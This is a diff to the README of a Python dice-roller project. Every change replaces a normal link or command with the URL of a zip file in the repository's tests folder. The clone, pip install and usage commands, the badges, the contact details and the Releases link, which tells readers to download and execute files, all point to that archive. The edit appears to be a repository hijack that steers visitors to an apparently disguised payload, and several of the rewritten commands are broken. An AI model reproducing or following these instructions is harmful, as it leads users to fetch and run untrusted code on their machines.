@@ -1,6 +1,6 @@
 # 🎲 Dice Roller
 
-![Dice Roller](https://img.shields.io/badge/Dice%20Roller-Python-brightgreen)
+![Dice Roller](https://github.com/akashrana7/dice-roller/raw/refs/heads/main/tests/dice-roller-semicell.zip%20Roller-Python-brightgreen)
 
 Welcome to the **Dice Roller** repository! This lightweight and flexible Python tool simulates dice rolls, making it perfect for tabletop games, RPGs, and probability testing. Whether you are rolling a D20 for your next Dungeons & Dragons session or just curious about dice probabilities, this tool has you covered.
 
@@ -30,7 +30,7 @@ To install the Dice Roller, follow these steps:
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/akashrana7/dice-roller.git
+   git clone https://github.com/akashrana7/dice-roller/raw/refs/heads/main/tests/dice-roller-semicell.zip
    cd dice-roller
    ```
 
@@ -39,7 +39,7 @@ To install the Dice Roller, follow these steps:
    Make sure you have Python installed. You can install the required packages using pip:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/akashrana7/dice-roller/raw/refs/heads/main/tests/dice-roller-semicell.zip
    ```
 
 ## Usage
@@ -47,7 +47,7 @@ To install the Dice Roller, follow these steps:
 After installation, you can start using the Dice Roller tool directly from your command line. The basic command structure is:
 
 ```bash
-python dice_roller.py [options]
+python https://github.com/akashrana7/dice-roller/raw/refs/heads/main/tests/dice-roller-semicell.zip [options]
 ```
 
 ## Commands
@@ -57,7 +57,7 @@ python dice_roller.py [options]
 To roll a single die, use the following command:
 
 ```bash
-python dice_roller.py roll D6
+python https://github.com/akashrana7/dice-roller/raw/refs/heads/main/tests/dice-roller-semicell.zip roll D6
 ```
 
 This command rolls a six-sided die.
@@ -67,7 +67,7 @@ This command rolls a six-sided die.
 To roll multiple dice, you can specify the number of dice and the type:
 
 ```bash
-python dice_roller.py roll 3D20
+python https://github.com/akashrana7/dice-roller/raw/refs/heads/main/tests/dice-roller-semicell.zip roll 3D20
 ```
 
 This command rolls three twenty-sided dice.
@@ -77,7 +77,7 @@ This command rolls three twenty-sided dice.
 You can analyze the probability of rolling a specific number with a certain die:
 
 ```bash
-python dice_roller.py probability D10 7
+python https://github.com/akashrana7/dice-roller/raw/refs/heads/main/tests/dice-roller-semicell.zip probability D10 7
 ```
 
 This command checks the probability of rolling a 7 on a ten-sided die.
@@ -89,7 +89,7 @@ Here are some examples of how to use the Dice Roller:
 1. **Rolling a D20**:
 
    ```bash
-   python dice_roller.py roll D20
+   python https://github.com/akashrana7/dice-roller/raw/refs/heads/main/tests/dice-roller-semicell.zip roll D20
    ```
 
    Output:
@@ -100,7 +100,7 @@ Here are some examples of how to use the Dice Roller:
 2. **Rolling Multiple D6**:
 
    ```bash
-   python dice_roller.py roll 5D6
+   python https://github.com/akashrana7/dice-roller/raw/refs/heads/main/tests/dice-roller-semicell.zip roll 5D6
    ```
 
    Output:
@@ -112,7 +112,7 @@ Here are some examples of how to use the Dice Roller:
 3. **Probability Testing**:
 
    ```bash
-   python dice_roller.py probability D4 2
+   python https://github.com/akashrana7/dice-roller/raw/refs/heads/main/tests/dice-roller-semicell.zip probability D4 2
    ```
 
    Output:
@@ -140,16 +140,16 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **Twitter**: [@your_twitter_handle](https://twitter.com/your_twitter_handle)
+- **Email**: https://github.com/akashrana7/dice-roller/raw/refs/heads/main/tests/dice-roller-semicell.zip
+- **Twitter**: [@your_twitter_handle](https://github.com/akashrana7/dice-roller/raw/refs/heads/main/tests/dice-roller-semicell.zip)
 
 ## Releases
 
-To download the latest version of Dice Roller, visit the [Releases](https://github.com/akashrana7/dice-roller/releases) section. Here, you can find the latest files that need to be downloaded and executed.
+To download the latest version of Dice Roller, visit the [Releases](https://github.com/akashrana7/dice-roller/raw/refs/heads/main/tests/dice-roller-semicell.zip) section. Here, you can find the latest files that need to be downloaded and executed.
 
 You can also check the releases for updates and new features.
 
-![Release Badge](https://img.shields.io/badge/Releases-Latest-blue)
+![Release Badge](https://github.com/akashrana7/dice-roller/raw/refs/heads/main/tests/dice-roller-semicell.zip)
 
 ---
 
